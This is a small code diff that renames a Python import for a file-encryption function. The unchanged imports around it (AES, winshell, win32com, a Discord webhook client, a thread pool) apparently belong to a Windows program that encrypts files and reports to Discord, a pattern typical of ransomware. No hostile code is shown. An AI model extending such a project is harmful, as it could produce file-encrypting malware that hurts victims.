@@ -13,7 +13,7 @@ from concurrent.futures import ThreadPoolExecutor
 import requests
 import winshell
 from Crypto.Cipher import AES
-from EDFile import encrypt_file
+from file_crypto import encrypt_file
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from win32com.client import Dispatch
 
